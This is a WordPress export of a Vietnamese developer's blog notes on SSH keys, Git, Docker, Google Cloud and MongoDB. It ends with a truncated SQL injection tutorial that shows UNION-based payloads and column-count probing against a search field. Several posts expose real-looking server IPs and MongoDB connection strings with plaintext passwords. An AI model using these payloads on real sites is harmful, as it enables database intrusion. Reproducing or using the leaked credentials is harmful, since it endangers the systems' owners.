# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKuMvHV/urlcaC6hnCy++9AKVJkNAKWc+sPZ1/QMTeeSRkj8uXiVoxtua3TKsdA3ETYiKLnN7/Krdz14XI5tb7yTgOHBmSPpo/lOYcEn+sD8E1fsNdOy11Hi9OsRWUaSOHf+1ROG5gtgIN0rXiFbuCpxNYdiCCsClNpvBrn0A11hfp7za08mLB9C/xUl1a0oyLFyDd95S50rMI28hyeWFtNBhcIPItNf/fBDfKqIwetgl5xrVASxRIOkWaiMximeRK7SUtcRnFhcaVuqLR/QWxviMirXF0w9rz4ULX2UYXF7eGxnm4xokaHoNwEULOP6megiHXuqmRewzVoslnn4QntNJfijPcyv2n3wqL4nXg6ZYVKiPx73GC/2YRA7mC0oVPJKavPANshCPkafoVzCFz95wVEQ8AvehiixWo3FqZ3ehsXeooPJ07lHb5XW09xBEzBxs/UB33N9ETxPpeg1JpkKUlVN1j1U7+UqWp8q6fJJECB8rhqN/zkg2W8cIaX6M= duy.ngo@DU-OS3-DUYNV

// Nội dung private key
$ cat ~/.ssh/version_schat
</pre>

<h2>4. Kết nối</h2>
4.1. Với github
Vào trang chủ -> Settings/SSH --> New SSH Key --> điền Public key vào --> là xong
<pre>
ssh -T git@github.com
// kết quả
The authenticity of host gitlab.com (207.97.227.239) can't be established.
# RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.
# Are you sure you want to continue connecting (yes/no)?

// gõ "yes"
# Hi duyk30b! You've successfully authenticated, but GitHub does not provide shell access.
</pre>

- Lưu ý với github: với key đã bị xóa thì không được phép dùng lại, buộc phải tại cặp key mới

4.2. Với server khác
- Server: thêm public key
- Client
<pre>
ssh -i /home/duy.ngo/.ssh/version_schat schatadmin@13.76.181.183
</pre>


<h2>5. Một vài lưu ý</h2>
1. Xóa cặp key
<pre>
// Kiểm tra các public key đang tồn tại trong ssh-add
$ ssh-add -L
// Kiểm tra các finger đang tồn tại trong ssh-add
$ ssh-add -l
</pre>
B1: Xóa thủ công trong folder /.ssh
B2: Xóa trong ssh-add
<blockquote>
ssh-add -D
</blockquote>

2. Nếu có cả cặp public-key và private-key --> để trong thư mục gốc /.ssh --> khi ssh sẽ tự động tìm key kết nối được --> ảo chưa
3. Nếu chỉ có mỗi private-key --> đương nhiên cần phải có tham số "-i" trong lệnh ssh
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2153</wp:post_id>
		<wp:post_date><![CDATA[2022-05-02 01:00:54]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-01 18:00:54]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-24 14:18:38]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-24 07:18:38]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[ssh-connect-by-key-1-create-public-key-and-private-key]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[SSH - Connect by Key: 2. Setting Server and Client]]></title>
		<link>https://duycode.com/2022/05/02/ssh-connect-by-key-2-setting-server-and-client/</link>
		<pubDate>Sun, 01 May 2022 19:00:16 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2170</guid>
		<description></description>
		<content:encoded><![CDATA[<blockquote>
Giả sử ta đã có 1 cặp key là: version_schat và version_schat.pub
- Phía Client sẽ dùng private key: version_schat
- Phía Server sẽ dùng publickey: version_schat.pub
</blockquote>

<h2>1. Config server</h2>
1.1. Cấu hình sshd
Với Ubnuntu: /etc/ssh/sshd_config 
Với Windows C:\ProgramData\sshd_config 

Bật xác thực bằng Key lên
<blockquote>
PubkeyAuthentication yes
AuthorizedKeysFile .ssh/authorized_keys
</blockquote>

1.2. Thêm public key
<pre>
$ cd .ssh

// Public key nằm trong file authorized_keys
$ ls -la
# authorized_keys
# known_hosts

// Mở file authorized_keys
$ cat authorized_keys
// trong file này chứa tất cả các public key của các máy khác đang kết nối
// Chỉ cần thêm public key vào file này là được
</pre>


<h2>2. Client thử connect bằng private key</h2>
2.1. Connect đơn giản
<pre>
$ cd ~/.ssh 
// -i: điền path lưu key
$ sudo ssh -i version_schat schatadmin@13.76.181.183
</pre>

2.2. Config Client
Để connect đơn giản cho những lần sau, có thể dùng file config schat
- Tạo file config
<pre>
// Show các file hiện có trong .ssh
$ ls ~/.ssh
# id_rsa
# id_rsa.pub
# known_hosts
# version_schat
# version_schat.pub

// Nếu chưa có file config thì cần phải tạo
$ touch ~/.ssh/config

// File này chỉ có thể đọc được và có thể ghi bởi người dùng và không thể truy cập được bởi người khác:
chmod 600 ~/.ssh/config

// Show lại kiểm tra xem đã có file config chưa
$ ls ~/.ssh
</pre>

- Sửa file config
<pre>
Host schat
	HostName 13.76.181.183
	User schatadmin
	Port 22
	PreferredAuthentications publickey
	IdentityFile "/home/duy.ngo/.ssh/version_schat"

</pre>

- Thử kết nối
<pre>
// Trước đây, khi connect thì cần như sau
$ cd ~/.ssh 
$ sudo ssh -i version_schat schatadmin@13.76.181.183

// Sau khi config
$ ssh schat
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2170</wp:post_id>
		<wp:post_date><![CDATA[2022-05-02 02:00:16]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-01 19:00:16]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-17 13:45:19]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-17 06:45:19]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[ssh-connect-by-key-2-setting-server-and-client]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[Git cơ bản - 4. Git flow]]></title>
		<link>https://duycode.com/2022/05/09/git-co-ban-4-git-flow/</link>
		<pubDate>Mon, 09 May 2022 03:13:44 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2121</guid>
		<description></description>
		<content:encoded><![CDATA[Các phiên bản thường dùng của 1 sản phẩm
1. Product * (phiên bản ổn định nhất)
2. Hotfix
3. Release * (phiên bản chưa ổn định)
4. Staging (Đã test xong, chờ xuất bản)
5. Test 
6. Base
7. Feature]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2121</wp:post_id>
		<wp:post_date><![CDATA[2022-05-09 03:13:44]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-09 03:13:44]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-09 03:13:44]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-09 03:13:44]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[git-co-ban-4-git-flow]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="applications"><![CDATA[Applications]]></category>
						</item>
					<item>
		<title><![CDATA[Git cơ bản – 5. Sử dụng SSH]]></title>
		<link>https://duycode.com/2022/05/12/git-co-ban-5-su-dung-ssh/</link>
		<pubDate>Thu, 12 May 2022 09:32:15 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2123</guid>
		<description></description>
		<content:encoded><![CDATA[1. Kiểm tra máy tính có ssh chưa
<pre>
$ ls -al ~/.ssh

## Kết quả
id_rsa      --> private key
id_rsa.pub  --> public key
id_dsa.pub
id_ecdsa.pub
id_ed25519.pub
</pre>

2. Sinh 1 SSH key mới
<pre>
ssh-keygen -t rsa -b 4096 -C "email_cua_ban@example.com" 
// ngắn gọn hơn
ssh-keygen -t rsa

// Lưu ý: rsa không được sử dụng nữa -> chuyển sang dùng ecdsa
ssh-keygen -t ecdsa -b 521 -C "your_email@example.com"

// Máy tính hỏi nơi lưu key (nên để mặc định)
Enter file in which to save the key (/Users/binhcq/.ssh/id_rsa): [Press enter]

// Nhập mật khẩu cho key
Enter passphrase (empty for no passphrase): [Type a passphrase]
# Enter same passphrase again: [Type passphrase again]

// Sau khi xong thì được kết quả như sau
Your identification has been saved in /Users/you/.ssh/id_rsa.
# Your public key has been saved in /Users/you/.ssh/id_rsa.pub.
# The key fingerprint is:
# 01:0f:f4:3b:ca:85:d6:17:a1:7d:f0:68:9d:f0:a2:db email_cua_ban@example.com
</pre>

3. Thêm key vào ssh-agent
<pre>
// Kiểm tra ssh-agent xem đã được kích hoạt chưa
eval "$(ssh-agent -s)"
// Kết quả
# Agent pid 59566

// Thêm key vào ssh (nếu tên key khác "id_rsa" thì nhớ đổi)
ssh-add ~/.ssh/id_rsa
</pre>

4. Thêm ssh public key vào github
<pre>
// mở file public key ra để copy
cat ~/.ssh/id_rsa.pub

// Sau đó lên Github ->  vào Settings/SSH --> New SSH Key --> điền Public key vào --> là xong
</pre>

5. Kiểm tra lại kết nối
<pre>
ssh -T git@github.com
// kết quả
The authenticity of host gitlab.com (207.97.227.239) can't be established.
# RSA key fingerprint is 16:27:ac:a5:76:28:2d:36:63:1b:56:4d:eb:df:a6:48.
# Are you sure you want to continue connecting (yes/no)?

// gõ "yes"
# Hi duyk30b! You've successfully authenticated, but GitHub does not provide shell access.
</pre>



]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2123</wp:post_id>
		<wp:post_date><![CDATA[2022-05-12 16:32:15]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-12 09:32:15]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-24 11:32:03]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-24 04:32:03]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[git-co-ban-5-su-dung-ssh]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="applications"><![CDATA[Applications]]></category>
						</item>
					<item>
		<title><![CDATA[Google Cloud Platform - Cơ bản]]></title>
		<link>https://duycode.com/2022/05/13/google-cloud-platform-co-ban/</link>
		<pubDate>Fri, 13 May 2022 03:36:29 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2126</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Bật RDP (Remote Desktop Protocol) để thao tác bằng tay</h2>
- Dùng SSH cài đặt như sau:
<pre>
sudo apt-get update
sudo apt-get install -y xrdp
sudo apt-get install -y xfce4
sudo service xrdp restart
</pre>

- Sau đó tạo password
<pre>
sudo -s
passwd
// Gõ pass word
</pre>

- Kiểm tra bên tab VPC Network xem kết nối ok chưa]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2126</wp:post_id>
		<wp:post_date><![CDATA[2022-05-13 10:36:29]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-13 03:36:29]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-13 14:54:51]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-13 07:54:51]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[google-cloud-platform-co-ban]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[Docker - 1: Image, Container and Network]]></title>
		<link>https://duycode.com/2022/05/15/docker-1-image-container-and-network/</link>
		<pubDate>Sat, 14 May 2022 18:00:17 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2143</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Images trong Docker</h2>
<pre>
$ sudo docker images
$ sudo docker search ubuntu
$ sudo docker pull ubuntu:18.04
$ sudo docker pull redis:7.0.0
$ sudo docker pull mysql:latest

$ sudo docker image rm redis:7.0.0
$ sudo docker image history mysql
$ sudo docker inspect mysql:latest
</pre>

<h2>2. Container trong Docker</h2>
<pre>
$ sudo docker ps -a

// Tạo container: docker run <thamso> <IMAGE> <command> <thamsolenh>
// -t: terminal, -d: chạy nền, --rm: thoát sẽ remove
$ sudo docker run -it ubuntu:18.04
$ sudo docker run -it --name "TestCentOS" -h centos1 centos:latest

// Tranh thủ kiểm tra luôn xem container ubuntu chạy thế nào
root@bcd0966b68e6:/# cat /etc/*release
root@bcd0966b68e6:/# exit

$ sudo socker inspect bcd0966b68e6
$ sudo docker stop bcd0966b68e6
$ sudo docker start bcd0966b68e6

$ sudo docker rm bcd0966b68e6
$ sudo docker rm -f bcd0966b68e6

// Vào lại terminal của container
$ sudo docker attach bcd0966b68e6

// Chạy 1 lệnh trong container
$ sudo docker exec TestUbuntu ls

// Khởi động bash trong ubuntu
$ sudo docker exec -it TestUbuntu bash

// Thoát vẫn giữ container chạy -> Dùng tổ hợp phím: Ctrl + P + Q
// Kiểm tra container đã thay đổi những file gì so với từ khi sinh ra
$ sudo docker diff TestUbuntu
# A: tạo mới
# C: thay đổi
# D: xóa

// Kiểm tra logs của container c-php
// --tail 10: lấy 10 dòng cuối
// -f: lấy liên tục
$ sudo docker logs c-php
$ sudo docker logs --tail 10 c-php
$ sudo docker logs -f c-php

// Giám sát tài nguyên của tất cả các container đang chạy
// Hoặc giám sát các container: c-php, c-mysql
$ sudo docker stats
$ sudo docker stats c-php c-mysql
</pre>

<h2>3. Docker Network</h2>
<pre>
$ sudo docker network ls
$ sudo docker network create --driver bridge mynetwork
$ sudo docker network create --driver bridge network1
$ sudo docker network rm network1
$ sudo docker network inspect mynetwork 
// Thêm 1 container mycontainer vào network có tên mynetwork 
docker network connect mynetwork mycontainer
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2143</wp:post_id>
		<wp:post_date><![CDATA[2022-05-15 01:00:17]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-14 18:00:17]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-06-12 14:33:49]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-06-12 07:33:49]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[docker-1-image-container-and-network]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[Docker - 3: Volumes]]></title>
		<link>https://duycode.com/2022/05/15/docker-3-volumes/</link>
		<pubDate>Sat, 14 May 2022 20:00:48 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2148</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>1. Chia sẻ dữ liệu giữa máy host và container</h2>
<pre>
// Giả sử dữ liệu để ở thư mục Draf trong Ubuntu. Lấy path:
$ pwd
#home/duy.ngo/Draf

// Kiểm tra các volume
$ sudo docker volume ls

// Tạo ổ đĩa D1, D2
$ sudo docker volume create D1
$ sudo docker volume create D2

// Tạo ổ đĩa D3 ánh xạ vào thư mục Draf
$ sudo docker volume create --opt device=/home/duy.ngo/Draf --opt type=none --opt o=bind D3

// kiểm tra ổ đĩa D3
$ sudo docker inspect D3
#[
#    {
#        "CreatedAt": "2022-05-16T17:52:48+07:00",
#        "Driver": "local",
#        "Labels": {},
#        "Mountpoint": "/var/lib/docker/volumes/D3/_data",
#        "Name": "D3",
#        "Options": {
#            "device": "/home/duy.ngo/Draf",
#            "o": "bind",
#            "type": "none"
#        },
#        "Scope": "local"
#    }
#]

// xóa ổ đĩa D1
$ sudo docker volume rm D1

// Kiểm tra lại các volume
$ sudo docker volume ls

// Tạo 1 container. Ánh xạ thư mục Draf vào thư mục /home/dulieu trong container
$ sudo docker run -it --name FirstUbuntu -v /home/duy.ngo/Draf:/home/dulieu e03f35874101

// Tạo container thứ 2 dùng chung Volums với container FirstUbuntu
$ sudo docker run -it --name SecondUbuntu --volumes-from FirstUbuntu e03f35874101

// Tạo container thứ 3 ánh xạ vào ổ đĩa D2
$ sudo docker run -it --name ThreeUbuntu --mount source=D2,target=/home/dulieu e03f35874101

// Tạo container thứ 4 dùng ở đĩa D3 (ổ D3 phải dùng -v mà ko dùng mount)
$ sudo docker run -it --name FourUbuntu -v D3:/home/disk e03f35874101

</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2148</wp:post_id>
		<wp:post_date><![CDATA[2022-05-15 03:00:48]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-14 20:00:48]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-18 17:46:48]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-18 10:46:48]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[docker-3-volumes]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[NTQ - Demo Project]]></title>
		<link>https://duycode.com/2022/05/02/ntq-demo-project/</link>
		<pubDate>Sun, 01 May 2022 20:00:45 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2162</guid>
		<description></description>
		<content:encoded><![CDATA[Mô hình các Server trông như sau

1. Tại Local
<blockquote>
// SSH vào ServerSSH bằng private key: version_schat 
$ cd ~/.ssh
$ sudo ssh -i version_schat schatadmin@13.76.181.183
// hoặc
ssh -i /home/duy.ngo/.ssh/version_schat schatadmin@13.76.181.183
# [schatadmin@Schat-SSH-to-SGH ~]$
</blockquote>

2. Tại ServerSSH
<pre>
// SSH vào Server Deploy
[schatadmin@Schat-SSH-to-SGH ~]$ bash ssh/live/deploy1.sh
#[schatadmin@sg-scdeploy01 ~]$
</pre>

3. Tại Server Deploy
<pre>
// SSH vào server QA
[schatadmin@sg-scdeploy01 ~]$ bash ssh/qa/qa3.sh 
[qaschatadmin@qa-schat03 ~]$
</pre>

4. Tại Server QA
<pre>
// Dùng mongo nào
[qaschatadmin@qa-schat03 ~]$ mongo 'mongodb://appqa2schat:tahcs2aqppa@10.240.12.102:27017/schat?replicaSet=QA-schat-02'
# MongoDB shell version v4.0.20
# MongoDB server version: 4.2.17-17
QA-schat-02:PRIMARY>

// Bắt đầu query
QA-schat-02:PRIMARY> db.getCollection('rocketchat_settings').find({_id:'Accounts_SearchFields'})

// Query vui vui
db.getCollection('rocketchat_organization').find({user: {$elemMatch: {username: "wyungjung"}}},{"user.$": 1})
</pre>
]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2162</wp:post_id>
		<wp:post_date><![CDATA[2022-05-02 03:00:45]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-01 20:00:45]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-05-17 16:46:38]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-05-17 09:46:38]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[ntq-demo-project]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[Docker - 4: Networking]]></title>
		<link>https://duycode.com/2022/05/18/docker-4-networking/</link>
		<pubDate>Wed, 18 May 2022 11:19:31 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2186</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Kết nối giữa các Container</h2>
<pre>
// busybox là 1 images chứa nhiều lệnh liên quan đến mạng (như ping, http)
$ docker pull busybox
$ docker run -it --rm busybox
// kiểm tra các lệnh có trong busybox
ls -la /bin/
ping google.com.vn

// B1 mặc định (không có ánh xạ cổng, và sử dụng network mặc định là bridge)
$ docker run -it --name B1 busybox

// B2 ánh xạ từ localhost:8888 đến cổng 80
$ docker run -it --name B2 -p 8888:80 busybox

// B3 sử dụng network là: mynetwork
$ docker run -it --name B3 --network mynetwork busybox

// B4 sử dụng network là mynetwork, ánh xạ từ localhost:9999 đến cổng 80
$ docker run -it --name B4 busybox

// Lưu ý 1: Ctrl + P + Q để thoát terminal của container mà ko exit container đó
// Lưu ý 2: B1 và B2 dùng chung mạng bridge nên kết nối được với nhau, nhưng không cùng mạng với B3, B4 nên không kết nối được


// Xem chi tiết 1 container
$ docker inspect B1

// Tại B2 thử tạo 1 http (B4 làm tương tự)
docker attach B2
cd var/www
// Tạo máy chủ http làm việc trên thư mục này và sử dụng cổng PORT 80
httpd
// Tạo 1 file html trong thư mục này
vi index.html
// Sửa nội dung file thành: "Server is running"

// Tại B1 sử dụng ping đến google hoặc B2
docker attach B1
ping google.com      --> ok
ping 172.17.0.3      --> ping đến B2 --> ok
ping 172.20.0.2      --> ping đến B3 --> ok (do B3 đã được connect tới bridge)
ping 172.20.0.3      --> ping đến B4 --> failed

// Khi cùng network, có thể dùng tên container để ping
ping B2
ping B3

// Thử http get đến B2
wget -O - 172.17.0.3
wget -O - B2
# Server is running

// Tại trình duyệt máy host truy cập: http://127.0.0.1:8888
# Server is running
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2186</wp:post_id>
		<wp:post_date><![CDATA[2022-05-18 18:19:31]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-18 11:19:31]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-06-12 12:23:31]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-06-12 05:23:31]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[docker-4-networking]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="docker"><![CDATA[Docker]]></category>
						</item>
					<item>
		<title><![CDATA[MongoDB - Một số lệnh Shell]]></title>
		<link>https://duycode.com/2022/05/23/mongodb-mot-so-lenh-shell/</link>
		<pubDate>Mon, 23 May 2022 03:43:27 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2234</guid>
		<description></description>
		<content:encoded><![CDATA[<h2>Một số lệnh Shell cơ bản</h2>
<pre>
// Connect db
mongo mongodb://schat:schat12345@10.240.13.38:27017/schat?authSource=schat

// Show all collections
show collections

// Find document in collection: rocketchat_settings
db.getCollection('rocketchat_settings').findOne({_id: "User's Vacation Status"})

// Remove
db.getCollection('rocketchat_settings').remove({_id: "User's Vacation Status"})
</pre>

<h3>1. Tìm document theo _id khi không biết Collection</h3>
- tìm bằng Robo 3T
<pre>
db.getCollectionNames().forEach(function(collName) {
    var doc = db.getCollection(collName).findOne({"_id" : "FfEG6ycEqCP8Lxbmm"});
    if(doc != null) print(doc._id + " was found in " + collName); 
}); 
</pre>

<h3>1 số ví dụ</h3>
<pre>
this.model.rawCollection().aggregate([
			{ $sort: { _updatedAt: -1 } },
			{
				$group: { _id: '$tabId', emojis: { $push: '$$ROOT' } },
			},
			{
				$lookup: {
					from: EmojiCustomTab.collectionName,
					localField: '_id',
					foreignField: '_id',
					as: 'tab',
				},
			},
			{
				$project: {
					_id: false,
					emojis: 1,
					tab: 1,
					tabName: {
						$cond: [
							{ $gt: [{ $size: '$tab' }, 0] },
							{ $arrayElemAt: ['$tab.tabName', 0] },
							'',
						],
					},
					tabId: {
						$cond: [
							{ $gt: [{ $size: '$tab' }, 0] },
							{ $arrayElemAt: ['$tab._id', 0] },
							'',
						],
					},
				},
			},
		]).toArray();

this.model.rawCollection().aggregate([
			{ $match: { _id } },
			{
				$lookup: {
					from: EmojiCustomTab.collectionName,
					localField: 'tabId',
					foreignField: '_id',
					as: 'tab',
				},
			},
			{
				$addFields: {
					tabName: {
						$cond: [
							{ $gt: [{ $size: '$tab' }, 0] },
							{ $arrayElemAt: ['$tab.tabName', 0] },
							'Smilemates',
						],
					},
					tabId: {
						$cond: [
							{ $gt: [{ $size: '$tab' }, 0] },
							{ $arrayElemAt: ['$tab._id', 0] },
							'',
						],
					},
				},
			},
		]).toArray();
</pre>]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>2234</wp:post_id>
		<wp:post_date><![CDATA[2022-05-23 10:43:27]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-05-23 03:43:27]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-07-13 13:43:18]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-07-13 06:43:18]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[open]]></wp:ping_status>
		<wp:post_name><![CDATA[mongodb-mot-so-lenh-shell]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="category" nicename="sql"><![CDATA[SQL]]></category>
						</item>
					<item>
		<title><![CDATA[SQL Injection]]></title>
		<link>https://duycode.com/2022/05/27/sql-injection/</link>
		<pubDate>Fri, 27 May 2022 06:54:11 +0000</pubDate>
		<dc:creator><![CDATA[admin]]></dc:creator>
		<guid isPermaLink="false">https://duycode.com/?p=2245</guid>
		<description></description>
		<content:encoded><![CDATA[Một số nguyên tắc
- Kết thúc lệnh bằng: "-- "(có dấu cách) để toàn bộ đoạn sau thành comment
<pre>


// Thử search trên ô tìm kiếm
may tho'
# You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''' at line 1
# SELECT * FROM tblsanpham WHERE status=1 AND title LIKE '%man'%'

// Thử tiếp (nhớ có dấu cách cuối câu lệnh) xem có thành công không
may tho%' UNION SELECT * FROM tblsanpham WHERE status=1 AND title LIKE '%mau%' -- 

// Tìm kiếm xem câu select trước đó có bao nhiêu field
// Thay đổi số lượng số 1 đến khi đủ field thì thôi (như trường hợp này ta dò được 16 field)
may tho%' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16 -- 
# The used SELECT statements have a different number of columns
